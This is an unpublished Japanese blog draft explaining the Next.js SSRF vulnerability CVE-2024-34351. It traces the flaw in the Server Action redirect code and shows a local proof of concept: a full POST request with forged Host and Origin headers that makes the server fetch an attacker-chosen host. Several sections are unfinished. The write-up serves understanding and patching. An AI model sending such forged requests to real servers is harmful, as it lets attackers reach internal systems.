---
title: "Next.jsのSSRF脆弱性 CVE-2024-34351"
emoji: "⚠️"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: ["react", "nextjs"]
published: false
---

Next.jsで**SSRF**（=Server Side Request Forgery）の脆弱性が発覚したことが社内で話題になったので、まとめておこうと思います。対象の脆弱性は以下です。

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-34351

https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g

## 脆弱性の概要

SSRF脆弱性は本来到達できないサーバーに対して、公開されてるサーバーを経由してアクセスすることができてしまう脆弱性です。

https://blog.tokumaru.org/2018/12/introduction-to-ssrf-server-side-request-forgery.html

今回のNext.jsの脆弱性はhttpヘッダーの`Host`を書き換えることで、self hostingなNext.jsサーバーからhttpリクエストを送信できてしまうというものです。これは、外部には公開してない内部APIに対してリクエストを送信できる可能性も含まれます。

この脆弱性は以下の条件を満たした時に成立します。

- Next.jsをself hostingで運用している
- Next.jsアプリケーションがServer Actionsを利用している
- Server Actionが`redirect()`を`/`から始まるパスで呼び出している

これらの条件を満たす時に、SSRF攻撃が成り立つ可能性があります。

### 最新バージョンでの状況

> There are no official workarounds for this vulnerability. We recommend upgrading to Next.js 14.1.1.

とある通り、本脆弱性は`v14.1.1`ですでに解消されているとされています。ただし、公式には言及されてないもののカスタムサーバー（expressやfastify）を利用している場合**この脆弱性が解消してない**ようです。

:::message alert
対応されたとされる部分の実装を確認する限りカスタムサーバーでは解消してない可能性が高いですが、カスタムサーバーについては筆者は未検証なので、これらの条件が当てはまる方は自身で脆弱性の有無を検証することをお勧めします。
:::

## 脆弱性の原因実装と詳細

脆弱性が解消されたとされるのがv14.1.1なので、v14.1.0時点での実装を元に説明します。今回の脆弱性は`redirect()`を呼び出した時の処理に起因しています。

`createRedirectRenderResult`は命名の通り、`redirect()`を呼び出した時に返されるRSC Payloadを生成する関数です。

https://github.com/vercel/next.js/blob/v14.1.0/packages/next/src/server/app-render/action-handler.ts#L147C16-L153

この関数の中でリクエストオブジェクトの`Host`を参照し、`fetchUrl`を生成しています。

https://github.com/vercel/next.js/blob/v14.1.0/packages/next/src/server/app-render/action-handler.ts#L160-L163

そしてそれをそのまま、`fetch`の引数に利用しています。

https://github.com/vercel/next.js/blob/v14.1.0/packages/next/src/server/app-render/action-handler.ts#L183-L190

つまり、`Host`を書き換えればこのフォーマットに沿ったURLを生成することができ、任意のサーバーにリクエストを送信することができてしまうのです。ただし、上記実装ではHEADリクエストが成功しないとGETリクエストに進まないので、多くの場合**任意のHostにHEADリクエストを送信できる**ということになります。

### そもそもなぜ`redirect`で`fetch`してるのか

そもそもなぜ`redirect`で`fetch`を呼び出しているのでしょうか？

Server Actionsは通常formをsubmitして呼び出しますが、これはクライアントサイドから自画面へPOSTリクエストを送信することで呼び出しています。このPOSTリクエストがServer Actionsの実態で、`redirect`がServer Actions内で呼び出されると、このレスポンスに**リダイレクト先のRSC Payloadが含まれるようになります**。そうすることで、通常リダイレクト時に発生するhttp通信のラウンドトリップを1回減らすことができます。

_Server Actionsを呼び出した時のPOSTのレスポンス_

```text
2:I[1758,["931","static/chunks/app/page-0854063c8a2761bf.js"],""]
4:I[6605,[],""]
5:I[335,[],""]
3:{"id":"2436a10b19c8cb512110aa93eaeb1eedad656714","bound":null}
0:["XPabJU6EC5bmFbyr5UtJF",[[["",{"children":["__PAGE__?{\"search\":\"test\"}",{}]},"$undefined","$undefined",true],["",{"children":["__PAGE__",{},["$L1",[["$","h1",null,{"children":"Hello, Next.js!"}],["$","$L2",null,{}],["$","form",null,{"action":"$F3","children":["$","button",null,{"type":"submit","children":"redirect"}]}]],null]]},[null,["$","html",null,{"lang":"en","children":["$","body",null,{"children":["$","$L4",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L5",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":"404"}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],"notFoundStyles":[],"styles":null}]}]}],null]],[null,"$L6"]]]]
6:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}]]
1:null
```

このリダイレクト先のRSC Payloadを生成するための処理が`createRedirectRenderResult`なのですが、この関数は**Next.jsサーバーからNext.jsサーバーへリクエストを投げてRSC Payloadを取得しています**。`http://localhost:3000`へのPOSTがされると、Next.jsはさらに内部的に自身のURLである`http://localhost:3000`へ向けてfetch（前述の通り`HEAD`+`GET`）するのです。このリクエスト処理が前述の`fetch`の部分です。

### 実際に攻撃が成り立つのかlocalhostで試してみる

ここまではNext.jsの実装を元に説明してきましたが、実際にこれが攻撃として成立するのかローカル環境で試してみます。

脆弱性が含まれているとされるNext.jsのv14.1.0の`createRedirectRenderResult`内にdebugコードを追加します。

```diff
  const fetchUrl = new URL(`${proto}://${host}${basePath}${redirectUrl}`)
+ console.log(">>> fetchUrl", fetchUrl);
```

```diff
  const headResponse = await fetch(fetchUrl, {
    method: 'HEAD',
    headers: forwardedHeaders,
    next: {
      // @ts-ignore
      internal: 1,
    },
  })
+   .catch((err) => {
+     console.error(">>> HEAD Request error", err);
+     throw err;
+   });
```

脆弱性が含まれていれば`Host`を改ざんすれば`fetchUrl`が任意のものに描き変わるはずです。今回は`http://localhost:3000`に対し`Host: localhost:9999`を付与したリクエストを送ってみます。`http://localhost:9999`は要していないので、`HEAD`リクエストが失敗して上記のエラーログが出力されるはずです。

以下は実際のリクエストを元に`Host`と`Origin`を改ざんしたhttpリクエストです。`Origin`も修正したのは、実際には`Host`と`Origin`が一致してないとエラーになってしまったためです。

:::details 攻撃http request
実際に画面からformをsubmitした時のリクエスト情報をコピーし、`Host`と`Origin`を書き換えたものです。
```http
POST http://localhost:3000/ HTTP/1.1
Accept: text/x-component
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Connection: keep-alive
Content-Length: 279
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBxBctGejLCXmkZbu
Host: localhost:9999
Next-Action: 2436a10b19c8cb512110aa93eaeb1eedad656714
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Origin: http://localhost:9999
Referer: http://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"

------WebKitFormBoundaryBxBctGejLCXmkZbu
Content-Disposition: form-data; name="1_$ACTION_ID_2436a10b19c8cb512110aa93eaeb1eedad656714"


------WebKitFormBoundaryBxBctGejLCXmkZbu
Content-Disposition: form-data; name="0"

["$K1"]
------WebKitFormBoundaryBxBctGejLCXmkZbu--
```
:::

実際にこのリクエストを送ると、以下のようなログが出力されました。

```text
>>> fetchUrl URL {
  href: 'http://localhost:9999/?test=1',
  origin: 'http://localhost:9999',
  protocol: 'http:',
  username: '',
  password: '',
  host: 'localhost:9999',
  hostname: 'localhost',
  port: '9999',
  pathname: '/',
  search: '?test=1',
  searchParams: URLSearchParams { 'test' => '1' },
  hash: ''
}
>>> HEAD Request error TypeError: fetch failed
    at Object.fetch (node:internal/deps/undici/undici:11730:11)
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)
    at async globalThis.fetch (/Users/satouakifumi/work/git/sandbox/nextjs-debug/.next/server/chunks/535.js:1:123496)
    ...
```

想定通り`fetchUrl`が`localhost:9999`になってしまって、`HEAD`リクエストが失敗しています。

TBW

## 脆弱性の原因となった箇所の周辺実装

TBW

### Server Actions+redirectの挙動
